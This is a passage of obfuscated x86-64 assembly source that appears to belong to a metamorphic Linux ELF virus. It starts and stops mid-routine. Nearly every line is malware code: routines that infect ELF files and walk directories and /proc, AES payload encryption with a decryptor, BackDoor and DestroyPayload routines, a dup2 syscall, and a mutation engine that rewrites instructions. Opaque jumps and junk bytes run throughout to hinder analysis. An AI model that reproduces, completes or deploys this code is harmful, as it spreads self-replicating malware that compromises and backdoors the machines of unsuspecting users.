    mov         rax, (-1)
    jmp         ..@jx1RDw0XG0Cb
..@Th1aVdI4KJP2:
    pop         rdx
    pop         rsi
    push        rdx
    jmp         $+5
db 0x01, 0x1d, 0x55
    jmp         ..@Bjy62HeTppFh
..@8dsM5CyW9fCS:
    xor         rax, rax
    jmp         ..@hqOV5rq8xhPb
..@PiG72qTh9F2y:
    je          ..@NT6TkKIglTKq
    jmp         ..@ssl5ZU9ODyu1
..@5gufWCQswaan:
    xchg        rbx, rbx
    cmp         dl, 0ebh
    je          ..@fdgLf0HkYCAP
    cmp         dl, 0e9h
    js          ..@6FQQ83cDjWqF
    jns         ..@6FQQ83cDjWqF
..@h8I50ANlWgmM:
    pop         rbx
    jmp         $+5
db 0x1d, 0xf0, 0x3b
    jmp         ..@9BU3ONjy7IwK
..@1uMjA0gM3qvo:
    jne         ..@7871YsfeDySB
    jmp         $+3
db 0x47
    jb          ..@youNcdonY06s
    jae         ..@youNcdonY06s
..@BXt7N3aK2lZ0:
    ret
    jmp         ..@K5dahWlbKrYZ
..@WEGT0rPiRw5r:
%ifdef X86_64
    pop         rbx
%endif
    jl          ..@KH9gXogLHpb8
    jge         ..@KH9gXogLHpb8
..@CEz9AKM8RNSZ:
    xor         r3, r3
    xor         r4, r4
    mov         r5, [rsp+_NBF_OFF.file]
    mov         r1, QWORD [r5+file.fileptr]
    mov         r2w, WORD [rsp+_NBF_OFF.index]
    jmp         $+4
db 0x7d, 0xeb
    jmp         $+4
db 0xe7, 0xdc
    jmp         ..@1c8gaS2nvgpD
..@rtaiAf5o2uu7:
    add         rdi, 2
    jmp         $+4
db 0xdd, 0x86
    jmp         $+3
db 0x01
    jl          ..@Cb7GfmKcZIUz
    jge         ..@Cb7GfmKcZIUz
..@ox4vTm4a9jOx:
%ifdef X86_64
    jne         ..@kIbOGQp3Nuyr
%endif
    js          ..@Fqo39XHFe88t
    jns         ..@Fqo39XHFe88t
..@nh7BLVYm4wiB:
    mov         rbx, rbx
    js          ..@QtII4L1aYDA2
    jns         ..@QtII4L1aYDA2
..@IbJjKztN2za0:
    xchg        rdx, rdx
    jmp         $+3
db 0xdc
    jb          ..@sw2fGQheBVQ1
    jae         ..@sw2fGQheBVQ1
..@PGaRVeFN5boa:
    xor         rax, rax
    xor         rdx, rdx
    xor         rbx, rbx
    mov         rdi, rsi
    js          ..@4u4KBgm0SXvV
    jns         ..@4u4KBgm0SXvV
..@1QgRipgWtEUb:
    call        ConvertPushPopValueToMoveValue
    jl          ..@NfJ2PLODzesD
    jge         ..@NfJ2PLODzesD
..@MfKay6kC7lCb:
    mov         r2, m5
    call        NonBinaryFile
    inc         WORD m5
    jl          ..@rS9uCH51peMQ
    jge         ..@rS9uCH51peMQ
..@vm1gTbXHFdbw:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
    mov         eax, SYS_DUP2
    syscall
    sub         r2, 1
%endif
    jl          ..@YBoCC4R5qQmI
    jge         ..@YBoCC4R5qQmI
..@wVRUXC9UU4YJ:
    xor         rcx, rcx
    mov         ecx, WINDOW_LENGTH
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    mov         rsi, rdi
    add         rsi, WINDOW_LENGTH
    jmp         $+5
db 0xa6, 0x7f, 0xc9
    jmp         $+3
db 0x1e
    jmp         $+4
db 0x5e, 0x33
    jmp         $+4
db 0x3e, 0x1e
    jmp         ..@zSBKMXNJ2olZ
..@2EQTK68sczqo:
    call        DestroyPayload
    jmp         $+3
db 0x23
    jmp         $+4
db 0x9b, 0x26
    jmp         ..@IqyIJNVLcwnu
..@x0OKh8VFmpvS:
    pop         rdi
    mov         r2w, WORD [rsp+_PAYLOAD_OFF.index]
    mov         r3d, DWORD [rsp+_PAYLOAD_OFF.key]
    mov         r4, m6
    je          ..@6ANI23iFMFnd
    jne         ..@6ANI23iFMFnd
..@Ee4DkrZ2gjvf:
    call        Aes256Encryption
    jmp         ..@DalaUHGULF3H
..@ex0TXX8rfCV0:
    call_vsp    Aes256KeyExpansion
    pop         rbp
    mov         rdx, rdx
    jmp         $+5
db 0x41, 0x5e, 0x82
    jmp         ..@rpik8HzTlgZS
..@RGp0JPK4ey6a:
    jmp         ..@I8YhNOgZ6gI7
    jl          ..@wt7LQzCE2Ont
    jge         ..@wt7LQzCE2Ont
..@DlBKXTXjWrh0:
    jmp         ..@ZXPIOjG7JwXG
    jmp         ..@QnBzPIvOvqEY
..@iawM7tZH8Wh9:
    xor         rax, rax
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    add         WORD [rsp+_LZSSE_OFF.la_index], ax
    jb          ..@8jVSi07Oa4lf
    jae         ..@8jVSi07Oa4lf
..@8gmG6Cy9nGYC:
    mov         QWORD [rsp+_DYNPIE_OFF.ptr], r1
    add         r1, e_h.e_shentsize
    mov         ax, WORD [r1]
    mov         WORD [rsp+_DYNPIE_OFF.shentsize], ax
    jmp         $+3
db 0xf7
    jmp         $+5
db 0xbb, 0xaf, 0xe4
    jmp         $+3
db 0x5b
    jmp         ..@2oDIu3yHRruH
..@7lu6g6FL8E97:
    lea         r5, [rsp+_INFDIR_OFF.dirbuf+r4]
    mov         ax, WORD [r5+linux_dirent.d_reclen]
    jmp         ..@m3RHT640wRdD
..@RGq4ydpd4bZk:
    mov         rdi, rdi
    js          ..@hFeP9gDYGW50
    jns         ..@hFeP9gDYGW50
..@QnBzPIvOvqEY:
    mov         edx, DWORD [rdi]
    jmp         ..@jQDFHsEhgPh5
..@pvrsuNFTJjmY:
    add         rax, r1
    pop         r1
    js          ..@NVMpO7JKUcFR
    jns         ..@NVMpO7JKUcFR
..@qLDQHkSh3Z6G:
    test        rax, rax
    jmp         $+4
db 0xac, 0xdb
    jl          ..@xI5OUL7yJqsl
    jge         ..@xI5OUL7yJqsl
..@o1NxyFPsUh23:
%ifdef X86_32
    xor         eax, eax
%endif
    jmp         ..@ouO0ogTYCDuq
..@UY1dteWuWwNS:
    pop         rcx
    jmp         ..@yjk827xWfw8Z
..@IjtgEvdd9E5e:
    mov         rsi, rsi
    jmp         $+4
db 0xa9, 0x94
    jl          ..@sIzvrnTviVFt
    jge         ..@sIzvrnTviVFt
..@EcqvuvkANxA6:
    mov         rdx, rdx
    mov         r4, r5
    and         r4, 10b
    jmp         $+3
db 0xb7
    jmp         ..@Q5PwhskNUNfm
BackDoor:
    jmp         ..@0fiIu6COUpml
..@U8EnATw385EA:
    pop         rcx
    jmp         $+4
db 0x11, 0x57
    js          ..@zE0FEX9ifOTo
    jns         ..@zE0FEX9ifOTo
..@zkjNEYpBT8he:
    push        rdi
    rep         nop
    pop         rdi
    jmp         $+3
db 0xa6
    jmp         ..@KfP45Im42VRF
..@bYCETUm6ysJq:
    pop         rcx
    xor         r1, r1
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.keyprev]
    call        WORDToDWORDASCII
    jl          ..@f1zPJKm2QSn0
    jge         ..@f1zPJKm2QSn0
..@oFEQhCAiS6Kn:
    xchg        rsi, rsi
    shl         rbx, 8
    xchg        rbx, rbx
    push        rsi
    jmp         $+4
db 0x75, 0x43
    js          ..@BqtVsM4NegEo
    jns         ..@BqtVsM4NegEo
..@SsBhCjDPL1KF:
    mov         rdx, rdx
    jl          ..@DXg4gnwBrHf7
    mov         r4, r5
    jmp         $+4
db 0x43, 0x61
    jmp         $+5
db 0x30, 0x02, 0x1d
    jl          ..@w2QHzYOPblJI
    jge         ..@w2QHzYOPblJI
..@DIfzTnPTQ6jI:
%ifndef ENABLE_DEBUGGING
    test        eax, eax
    jnz         ..@M8DTXjb1xutI
    rep         nop
%endif
    jb          ..@CwhflTQISPR1
    jae         ..@CwhflTQISPR1
..@48E7KTDwTzEA:
    call        GetNewProgramVaddr
    pop         r3
    pop         r2
    jmp         $+5
db 0xe2, 0x73, 0x32
    js          ..@z4Uhs2fjxiwd
    jns         ..@z4Uhs2fjxiwd
..@RnfXANZ53czk:
    mov         r2, QWORD [r5+file.filesize]
    mov         rax, SYS_MUNMAP
    jmp         $+3
db 0x4c
    jl          ..@sSgKnH9kGJs1
    jge         ..@sSgKnH9kGJs1
..@AoqCNPv5cZSl:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jmp         $+5
db 0xa3, 0x89, 0x65
    jmp         ..@v7ECeEPo0D1M
..@p8dj0pvUBiDE:
    add         rdi, rcx
    mov         edx, DWORD [rdi]
    jl          ..@ctFoj25qMslR
    jge         ..@ctFoj25qMslR
..@f594BwxoM5D9:
    shl         edi, 0x8
    mov         rcx, rcx
    mov         ax, dx
    and         ax, 1111b
    jl          ..@5R2RslaXohZz
    jge         ..@5R2RslaXohZz
..@X8IsOzd9EOL0:
    push        rdi
    pop         rdi
    ret
    xchg        rcx, rcx
    jmp         $+5
db 0xf3, 0xdd, 0x48
    jb          GetNewProgramVaddr
    jae         GetNewProgramVaddr
..@J8CHzKxVUBNB:
    xor         rcx, rcx
    xor         rdx, rdx
    mov         edx, DWORD [rdi+rax+1]
    mov         ecx, edx
    je          ..@NjZR5GNu6FV1
    jne         ..@NjZR5GNu6FV1
KeyGen:
    jmp         ..@YOJnPV0ivFmj
..@T8Loyam7CoDt:
    rep         stosb
    jl          ..@n8SMFATxLf05
    jge         ..@n8SMFATxLf05
..@FSe2Kb0yv4vi:
    push        rax
    pop         rax
    rep         stosb
    xor         r2, r2
    jmp         $+4
db 0xcd, 0x98
    jmp         $+3
db 0x0a
    jmp         ..@CEz9AKM8RNSZ
..@bEmgdVVZGUhP:
    push        rax
    jmp         $+4
db 0xb0, 0xb0
    js          ..@c8wE4gJBLKzM
    jns         ..@c8wE4gJBLKzM
..@gVoAMq3m9nek:
    pop         rcx
    jb          ..@RYCnsRrYvdgH
    jae         ..@RYCnsRrYvdgH
..@a1DTkhEZR6zM:
    pop         rdi
    mov         DWORD [rdi], edx
    xchg        rdx, rdx
    jmp         ..@6B6oeBX9t6Du
    je          ..@6B6oeBX9t6Du
    jne         ..@6B6oeBX9t6Du
..@lzBEaQdqvSAk:
    pop         rbx
    xor         rax, rax
    jmp         ..@MtH4L9FmJIh7
    jmp         ..@SSRObxD4jSsD
..@BOyeyMnhcHWQ:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
%endif
    jmp         $+5
db 0xb9, 0xe5, 0xbf
    jmp         $+3
db 0x62
    jb          ..@YJQZXOkcpuob
    jae         ..@YJQZXOkcpuob
..@NVMpO7JKUcFR:
    mov         rdx, rdx
    mov         rcx, rcx
    jl          ..@GVpJr2Igv9Wp
    jge         ..@GVpJr2Igv9Wp
..@rOWMx0CFCMw3:
    lea         r2, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    call        Strcpy
    VAR         packed, status
    mov         r2, r5
    jmp         $+3
db 0x12
    jmp         $+5
db 0x7f, 0x79, 0x14
    je          ..@tLXznyibnrr9
    jne         ..@tLXznyibnrr9
..@5z7NIUNRBKXE:
    ret
    jmp         $+5
db 0x56, 0x00, 0x39
    jl          ConvertMoveToPushPop
    jge         ConvertMoveToPushPop
..@SZha7gGCoou7:
    mov         rbp, rbp
    jl          ..@ocFe07bfy03U
    jge         ..@ocFe07bfy03U
..@FbqdIWsPZ6dj:
    xor         rbx, rbx
    jl          ..@c0AHgfPEO1OW
    jge         ..@c0AHgfPEO1OW
..@b3iAI5BtdhRv:
    pop         r4
    jmp         ..@9C99Gu4KiI5p
..@wLHkTYOAuuCE:
    rep         nop
    pop         rsi
    mov         rax, (-1)
    ret
    jl          ConvertMoveValueToPushPopValue
    jge         ConvertMoveValueToPushPopValue
..@YtnYaSniTSrM:
    mov         rdx, rdx
    xor         rbx, rbx
    xchg        rsp, rsp
    jmp         $+4
db 0x4b, 0x5a
    jmp         ..@TzzlP47vvsSW
..@HHwHEO0zFE0O:
    push        rsi
    pop         rsi
    syscall
    jmp         ..@NT6TkKIglTKq
    js          ..@thFYj1In6xMU
    jns         ..@thFYj1In6xMU
..@1ta7OlaN9Eor:
    mov         rax, 0x1
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    jmp         ..@6T165rH4krB6
..@phpH0Cu7htZ8:
    jz          ..@Q3Wm1M6C5X1j
    jmp         ..@LiZoq41VZJnh
..@j2Nv61LvYIyt:
    mov         r1, rax
    mov         rsi, rsi
    xor         r2, r2
    jmp         ..@lrG19fhsf4mm
..@MtH4L9FmJIh7:
    pop         r2
    pop         r5
    jb          ..@731kUgxoZEss
    jae         ..@731kUgxoZEss
..@qGR65cfViTth:
    xchg        rdi, rdi
    jmp         $+3
db 0x57
    jb          ..@5KssRmNcpAmJ
    jae         ..@5KssRmNcpAmJ
..@xbS5QPBS6qYf:
    or          dl, 50h
    jb          ..@71bmS3iUIrJn
    jae         ..@71bmS3iUIrJn
..@XoQnVLZAlaT3:
    mov         QWORD m5, 0x01
    jmp         $+4
db 0xb3, 0xb3
    jl          ..@jDbfg0LSLKqd
    jge         ..@jDbfg0LSLKqd
..@f9apXuvSh8aq:
    pop         rcx
    pop         rsi
    mov         rax, (-1)
    ret
    jl          ConvertMoveZeroToXor
    jge         ConvertMoveZeroToXor
..@uPqwT1WuMIIc:
    CFILE       [rsp+_INFDIR_OFF.dirfd]
    push        rbx
    pop         rbx
    jmp         $+4
db 0x34, 0x94
    js          ..@73vNfyYZLPTo
    jns         ..@73vNfyYZLPTo
..@D4LyWb8Abb9v:
    mov         DWORD [rdi+5], 90909090h
    mov         WORD [rdi+9], 9090h
    jmp         $+4
db 0x56, 0xac
    jl          ..@1dvqf8bOnbIP
    jge         ..@1dvqf8bOnbIP
..@yUP3BprJtnBP:
%ifdef X86_64
    test        al, al
%endif
    jmp         $+5
db 0xed, 0x7d, 0x68
    jmp         $+4
db 0x45, 0xa0
    jmp         $+3
db 0xb2
    jl          ..@29PHlnfqcsGD
    jge         ..@29PHlnfqcsGD
..@7TXH1rK68TGu:
%ifdef X86_64
    mov         bl, sil
%endif
    jb          ..@sl7n7YJjJoaX
    jae         ..@sl7n7YJjJoaX
..@SjbFPvyl6C8Z:
    pop         rbx
    jmp         $+3
db 0x8c
    jmp         ..@hnKocn6VXAZb
MemMove:
    jmp         ..@sp0gi3Mp6LYY
..@cMxbqvTQda77:
    xchg        rcx, rcx
    jmp         $+3
db 0xb5
    jmp         $+5
db 0xcc, 0x70, 0x7d
    je          ..@pLPYkcSOrOsl
    jne         ..@pLPYkcSOrOsl
..@yKJT2mMsfkv5:
%ifdef X86_64
    mov         edx, DWORD [rdi]
    and         edx, 00f8fffah
%endif
    jmp         ..@djuiuMsvafsj
..@nUgpqNWAL03V:
    sub         ecx, 2
    shl         ecx, 8
    jb          ..@aLHos8H9ZB5q
    jae         ..@aLHos8H9ZB5q
..@wQxxQp2cS4ew:
    cmp         ecx, DWORD [rsp+_MUTA_OFF.size]
    jmp         $+4
db 0xc6, 0x6c
    jmp         ..@Z1cElXCgiw7C
..@NfJ2PLODzesD:
    xchg        rsi, rsi
    jmp         $+5
db 0x16, 0xb3, 0x8a
    jmp         ..@1ta7OlaN9Eor
..@jccSr2rdO8RW:
    add         rsi, QWORD [rdi+s_h.sh_offset]
    jmp         $+5
db 0xf7, 0x9e, 0x39
    jmp         $+5
db 0xfd, 0x65, 0x0b
    jmp         ..@wgs5h2i6lQu8
..@DYhtjgyU1vOi:
    shr         dx, 0x4
    add         ecx, 1
    cmp         cl, 0x4
    jl          ..@f594BwxoM5D9
    jmp         $+4
db 0xf0, 0xa5
    jb          ..@4hqjuZJ77y1o
    jae         ..@4hqjuZJ77y1o
..@ITVWM2hUobYU:
    sub         r5, 1
    rep         nop
    jmp         $+4
db 0xf0, 0xe8
    jmp         ..@fnonzxsl0K3R
IsNum:
    jmp         ..@QguOnmFZxljl
..@pHSIx1A7ZiBO:
    OFILE       [r5], 0x00
    cmp         eax, 0x3
    jmp         $+5
db 0xff, 0x5e, 0x78
    jb          ..@1xDfHGbTGEKC
    jae         ..@1xDfHGbTGEKC
..@m3RHT640wRdD:
    add         r5, rax
    jmp         ..@ITVWM2hUobYU
..@jhGH6iemD5ZE:
    test        al, al
    jb          ..@WZfQRAEvMlGt
    jae         ..@WZfQRAEvMlGt
..@xl6L2nvLftCz:
%ifdef X86_64
    test        al, al
%endif
    jb          ..@f8x7zLXP4Ssq
    jae         ..@f8x7zLXP4Ssq
..@Ihomzyk27B6q:
%ifndef ENABLE_DEBUGGING
    pop         rcx
%endif
    je          ..@M8DTXjb1xutI
    jne         ..@M8DTXjb1xutI
..@PUoboefzrrH6:
    jmp         ..@l3Yeg6dBRgaT
    jmp         $+5
db 0x8c, 0x81, 0x5d
    jmp         $+5
db 0xb1, 0x9d, 0x4c
    js          ..@bP0HUpeBx2BA
    jns         ..@bP0HUpeBx2BA
..@TCifyvYk1z6G:
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    jmp         ..@9XCSDAX1HfeS
..@Xwb3eli0aMYQ:
    push        rcx
    jl          ..@mB1Uaw57qg8S
    jge         ..@mB1Uaw57qg8S
..@rpik8HzTlgZS:
    xor         rcx, rcx
    jl          ..@QFM6wFZYAX1i
    jge         ..@QFM6wFZYAX1i
ConvertPushPopValueToMoveValue:
    jmp         ..@ookx2loQQX4z
..@A4vsXHx2FeNQ:
    and         edx, 111b
    or          dl, 58h
    mov         bl, dl
    jmp         $+3
db 0x20
    jl          ..@6rDQbVUrDv2Y
    jge         ..@6rDQbVUrDv2Y
..@6ANI23iFMFnd:
    xchg        rsp, rsp
    jmp         ..@fNDKlSogRC08
..@jJDNZ8vvMz9x:
    cmp         DWORD [r1+1], "home"
    jne         ..@n8bRDgeOgnvg
    cmp         BYTE [r1+5], '/'
    jl          ..@64eUowPCmLvF
    jge         ..@64eUowPCmLvF
..@HSJ4lcpFQXpd:
    and         bx, 00f8h
    jmp         ..@ehWMni5OiQKV
..@cXnVNccWZceC:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    jmp         $+3
db 0x05
    jmp         ..@OWPLnCHNh4r5
..@auPCTrviUCCb:
    xchg        rdi, rdi
    call        Strcpy
    mov         rbp, rbp
    mov         BYTE [r1], '/'
    jmp         ..@XhyNaOgVTvf7
..@s48FnoxXlLq9:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         $+3
db 0xe0
    jl          ..@2tgr1V7tXG8K
    jge         ..@2tgr1V7tXG8K
..@ByuMOzOnEJrk:
    push        rcx
    jmp         $+4
db 0x07, 0xc4
    jmp         ..@p61uJuGHb8qI
..@djuiuMsvafsj:
%ifdef X86_64
    push        rax
    pop         rax
    cmp         edx, 00c08348h
    je          ..@gdxWmThcBjhG
%endif
    jmp         ..@E5yjvm3u6KN7
..@6WV3PGyos4w5:
%ifndef ENABLE_DEBUGGING
    mov         rax, rax
%endif
    jmp         $+5
db 0x87, 0xe6, 0x46
    jb          ..@4dhrvau15P2U
    jae         ..@4dhrvau15P2U
..@Oe8AFKPZt6JZ:
%ifndef ENABLE_DEBUGGING
    jz          ..@6WV3PGyos4w5
%endif
    jmp         $+4
db 0x36, 0xec
    jmp         $+5
db 0x55, 0x30, 0xcf
    jmp         $+3
db 0x13
    jl          ..@UMPq6uvInJt5
    jge         ..@UMPq6uvInJt5
..@WRsMielqs0v2:
    add         rdi, rcx
    mov         edx, DWORD [rdi]
    js          ..@4xRwye6teTPF
    jns         ..@4xRwye6teTPF
..@9BU3ONjy7IwK:
    mov         BYTE [rdi], bl
    jmp         ..@0KzV0jr8sKBE
..@0oCBDX9I8G3t:
    mov         rax, (-1)
    jmp         $+3
db 0x43
    jb          ..@PeiebuCd2G5n
    jae         ..@PeiebuCd2G5n
..@6FQQ83cDjWqF:
    jne         ..@UY1dteWuWwNS
    js          ..@gH7criOwfBdm
    jns         ..@gH7criOwfBdm
..@7ZBmeOOOT6au:
%ifdef X86_64
    xor         rax, rax
%endif
    jmp         ..@uYqw1qaVPxZf
..@QzL9Nbsezoof:
    pop         rdi
    jmp         $+4
db 0xd1, 0x7c
    jmp         ..@9ZVDx8XmX6vs
..@5xhEhOUrYXzL:
%ifdef X86_64
    add         rcx, 1
%endif
    jmp         ..@SxmsLLvIDjvJ
..@szImhLLkRhm5:
    xor         r2, r2
    push        rcx
    pop         rcx
    mov         r1, m6
    je          ..@0pvuqtv98zwb
    jne         ..@0pvuqtv98zwb
..@kUHtx8Vw9ORH:
%ifdef X86_64
    mov         bx, dx
    and         bx, 0f8ffh
    cmp         bx, 5841h
%endif
    jmp         $+4
db 0x93, 0xd7
    jmp         $+5
db 0xf4, 0xdb, 0xe4
    jl          ..@ibHI3UocMnlw
    jge         ..@ibHI3UocMnlw
..@ix1GrRBvo7F3:
    and         edx, 0007h
    xchg        rcx, rcx
    xchg        rax, rax
    mov         bl, 58h
    or          bl, dl
    jmp         $+4
db 0xa9, 0xf3
    jl          ..@Y9GsjBOQ6Ngy
    jge         ..@Y9GsjBOQ6Ngy
..@QguOnmFZxljl:
    xor         rax, rax
    jmp         $+5
db 0x23, 0x1a, 0xd7
    jmp         ..@Au8w00JQTKtK
..@IqyIJNVLcwnu:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         $+5
db 0xd2, 0x98, 0x8a
    jmp         $+4
db 0xe6, 0xbb
    js          ..@vvukvyeBmcU5
    jns         ..@vvukvyeBmcU5
..@4Mvwv6LXtN5j:
    call        IsELFComplete
    test        al, al
    jnz         ..@n8bRDgeOgnvg
    mov         rax, 1
    jmp         ..@8HrabdZ1Md4z
..@lafPxKScuuDJ:
    mov         DWORD [rdi], ebx
    jmp         ..@aLe1NgsfrGrG
..@nz786sQpWMNH:
    push        rdi
    pop         rdi
    jb          ..@v3SaASiuaBmt
    jae         ..@v3SaASiuaBmt
..@WFSKuYnJMEHW:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x1
    xor         rax, rax
    jb          ..@DeWW3nBojH9f
    jae         ..@DeWW3nBojH9f
..@zNfQUJXChVl5:
    cmp         edx, 00700070h
    jmp         ..@OMVEMs21KhKE
..@yjk827xWfw8Z:
    pop         rsi
    mov         rax, (-1)
    mov         rdx, rdx
    js          ..@YcT2ZoUsywmz
    jns         ..@YcT2ZoUsywmz
..@FLZaJScZeNFW:
    add         r1, _signature-_start
    push        rdi
    jmp         $+5
db 0xe5, 0x22, 0xec
    jmp         ..@x0OKh8VFmpvS
..@f2zq1ZtKVQfm:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    xor         rax, rax
    je          ..@7lu6g6FL8E97
    jne         ..@7lu6g6FL8E97
..@mTn6lC7ajPSF:
    mov         rsi, rsi
    mov         rbx, QWORD [rsp+_MUTA_OFF.key]
    add         rbx, rdx
    jl          ..@1sIsQVUnhTvx
    jge         ..@1sIsQVUnhTvx
..@en1XpnCASMo1:
    test        r2, r2
    jz          ..@n8bRDgeOgnvg
    and         r2, 1b
    test        r2, r2
    jnz         ..@n8bRDgeOgnvg
    jmp         $+4
db 0x47, 0x94
    jmp         ..@Sk63d9FnyeZf
..@KBC2KQ9XKl17:
%ifdef X86_64
    mov         bl, 41h
%endif
    jmp         $+4
db 0x38, 0x4f
    jmp         $+5
db 0x71, 0x31, 0x3f
    jmp         $+4
db 0xc9, 0xb1
    jmp         $+4
db 0x0e, 0xe2
    jmp         ..@fHQb6ureMNSG
..@Ck1j1zopWJxj:
    pop         rdx
    je          ..@ZqdokFNNNXYD
    jne         ..@ZqdokFNNNXYD
..@jIohO6kvk3Md:
    pop         rdx
    mov         rsi, rdi
    jmp         $+4
db 0x0d, 0xde
    jmp         $+4
db 0x1d, 0xc8
    js          ..@ss2CF6vtJFbA
    jns         ..@ss2CF6vtJFbA
..@cvv6wNopR8si:
    xor         rdx, rdx
    mov         eax, DWORD [rdi+1]
    push        rcx
    pop         rcx
    jmp         $+4
db 0x8a, 0x22
    jmp         ..@jkTMZHWBDPF9
..@5GABoPVFxNRV:
    jne         ..@f9apXuvSh8aq
    jmp         $+3
db 0xf9
    jl          ..@emVtEp8JbSEw
    jge         ..@emVtEp8JbSEw
..@PP1Bp0OhnPMV:
%ifdef X86_64
    xchg        rcx, rcx
%endif
    jmp         ..@QiJX3p34IQf0
..@prbqmY2ABQAL:
    mov         rdi, rdi
    jl          ..@LCE56Fpw4Qkr
    jge         ..@LCE56Fpw4Qkr
..@t51iVl0V3Zky:
%ifndef ENABLE_DEBUGGING
    mov         rsi, rsi
%endif
    jb          ..@gvR834lDN6hJ
    jae         ..@gvR834lDN6hJ
..@f8x7zLXP4Ssq:
%ifdef X86_64
    jz          ..@ix1GrRBvo7F3
%endif
    jmp         $+4
db 0x83, 0x28
    jmp         ..@jbrRJqSEbYYd
..@nztl24vB8JaC:
    and         r3, 0xfff 
    jb          ..@jCeZZgDbMoVq
    jae         ..@jCeZZgDbMoVq
..@MZgmfQ5qMkV5:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    jmp         $+4
db 0x9e, 0x5c
    jb          ..@BvOdIpdRwvlx
    jae         ..@BvOdIpdRwvlx
DYNPIEValidation:
    jmp         ..@5dJPPoF1F8sg
..@Y8FJASZXDzdX:
    mov         r2, 0x100
    jmp         $+4
db 0x86, 0x55
    jmp         $+5
db 0xe4, 0x69, 0x8a
    jmp         $+3
db 0x06
    jmp         ..@rmXxWFeHDoMW
..@5lsYFr9KqSUL:
    cmp         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    js          ..@QYe6qURvDIRR
    jns         ..@QYe6qURvDIRR
..@A7KrE4DhAwbM:
    mov         r5, [rsp]
    push        rsi
    pop         rsi
    mov         QWORD [r5+file.fileptr], rax
    xor         rax, rax
    jmp         ..@EQQ31PvSyGJU
..@0c1xKvYi6An3:
    and         r5, (PAGE_SIZE-1)
    add         r3, r5
    jmp         $+3
db 0xaa
    jmp         ..@w32pVA3QUAln
..@U7580DFsEF3v:
    or          bl, 0b8h
    jmp         $+4
db 0xa3, 0x0d
    jmp         $+5
db 0x45, 0xd4, 0x05
    jb          ..@Zxdb9DCbKHjI
    jae         ..@Zxdb9DCbKHjI
..@Y1b8Ytcvbs1d:
    push        rax
    pop         rax
    jmp         $+4
db 0x5a, 0x45
    jmp         $+5
db 0x9c, 0x31, 0xd6
    js          ..@0k9Bi2DF1oNZ
    jns         ..@0k9Bi2DF1oNZ
..@4oOgnurVssu3:
    xchg        rsp, rsp
    push        rbp
    jmp         ..@muZ0ujcMLDdg
..@QmrqSQJa1bZv:
    xchg        rbx, rbx
    jl          ..@ujryU8GdDTvw
    jge         ..@ujryU8GdDTvw
..@wdlPM2P4Cse1:
    mov         r1, QWORD [r5+file.filesize]
    cmp         r1, e_h_size
    jmp         $+5
db 0x56, 0x53, 0xc0
    jmp         $+3
db 0xa0
    jl          ..@xERkZw7WZqtu
    jge         ..@xERkZw7WZqtu
..@YjcB9Mka3ZTa:
    xchg        rax, rax
    jl          ..@FbqdIWsPZ6dj
    jge         ..@FbqdIWsPZ6dj
..@hqOV5rq8xhPb:
    mov         r3, [r1+e_h.e_phoff]
    jmp         $+3
db 0xde
    jl          ..@mNHGLjgTNWnQ
    jge         ..@mNHGLjgTNWnQ
..@kIbOGQp3Nuyr:
    mov         cl, dl
    and         cl, 111b
    jmp         $+3
db 0xfc
    jl          ..@1FyeN4V6M4Ub
    jge         ..@1FyeN4V6M4Ub
..@6ZYbnEWxjJPO:
%ifndef ENABLE_DEBUGGING
    mov         r1d, 0x2
%endif
    jb          ..@2fT7YSDc1jBm
    jae         ..@2fT7YSDc1jBm
..@GCvgOaRLDl8H:
    pop         r4
    jmp         $+5
db 0xa2, 0xa4, 0xc3
    jmp         $+5
db 0xc8, 0x53, 0x15
    jmp         $+5
db 0xd5, 0x5f, 0x15
    jmp         $+5
db 0x85, 0x13, 0x4b
    jmp         $+3
db 0xed
    jmp         ..@vf9VIvdT8Pi4
..@vX9yIK8q0fDf:
    jz          ..@Axz8cAnkL80v
    add         r4, r3
    jmp         $+4
db 0x5d, 0xb9
    jmp         ..@ACNFaXIonE1Y
..@MxJLCFmQmRuk:
    mov         rcx, rcx
    jb          ..@zkjNEYpBT8he
    jae         ..@zkjNEYpBT8he
..@vUmEtPCVUEOf:
    je          ..@bYYaKTkE26mv
    cmp         rdi, rsi
    jmp         ..@uwE2Xwx42XOY
..@JQvxHffSZKpI:
    or          dl, 70h
    jmp         $+4
db 0xc8, 0xbe
    jmp         ..@nUgpqNWAL03V
..@Xo7nlmWvriMi:
    mov         WORD [rsp+_NBF_OFF.index], r2w
    mov         QWORD [rsp+_NBF_OFF.file], r1
    xchg        rdi, rdi
    lea         r1, [rsp+_NBF_OFF.key]
    call        KeyGen
    jmp         $+4
db 0x40, 0xa1
    jmp         $+4
db 0x1d, 0x69
    jmp         ..@CGVxK5QjCOdV
..@D8Ck1jGsYECi:
    cmp         BYTE [r1], 0x30
    jl          ..@zzBFybVeIetA
    js          ..@3oY9U8v87nMP
    jns         ..@3oY9U8v87nMP
..@64eUowPCmLvF:
    mov         rdi, rdi
    jne         ..@n8bRDgeOgnvg
    xchg        rsp, rsp
    mov         r2, QWORD [r5+file.fileptr]
    GGLOBAL     _signature
    jb          ..@McQe2Nrmg57D
    jae         ..@McQe2Nrmg57D
..@okGO53eqYIeO:
    mov         cl, dl
    or          cl, 1b
    shl         ecx, 16
    jmp         $+3
db 0x3d
    jmp         $+3
db 0x74
    jmp         $+3
db 0x64
    jb          ..@fAZy8aRiviUl
    jae         ..@fAZy8aRiviUl
..@hMotuyCPz5pO:
    add         r2, _virus-_start
    mov         r3, _decrypt-_virus
    call_vsp    Aes256KeyCreation
    mov         r1, m6
    add         r1, non_encrypted_len
    jmp         $+4
db 0xb6, 0x52
    jmp         $+4
db 0x67, 0x01
    jmp         ..@KpBu1Uf5PuWh
..@zf34d2qF09sq:
    pop         rdx
    js          ..@mDYAqODNm7tO
